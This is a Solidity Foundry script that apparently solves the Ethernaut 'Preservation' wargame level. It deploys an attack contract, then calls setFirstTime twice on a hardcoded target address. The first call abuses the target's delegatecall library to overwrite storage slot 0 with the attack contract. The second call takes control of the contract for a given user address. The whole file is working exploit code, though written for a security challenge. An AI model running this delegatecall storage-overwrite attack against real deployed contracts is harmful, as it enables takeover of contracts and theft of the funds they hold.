// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

import {PreservationSolution} from "../PreservationSolution.sol";

contract PreservationScript is Script {
  address private user = 0xF580A030d2f0E9667aB3c5c8a51Da63f086Db564;
  address private preservationContract = 0xFF9fe4072432eBc7770e4652F5E6EeaF733ca5dA;

  PreservationSolution private preservationSolution;

  function run() external {
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

    vm.startBroadcast(deployerPrivateKey);

    preservationSolution = new PreservationSolution();

    // change slot0 to our attack contract address
    (bool _resLib1, ) = preservationContract.call(abi.encodeWithSignature("setFirstTime(uint256)", address(preservationSolution)));
    require(_resLib1);

    // in here we are attacking
    preservationContract.call(abi.encodeWithSignature("setFirstTime(uint256)", user));

    vm.stopBroadcast();
  }
}
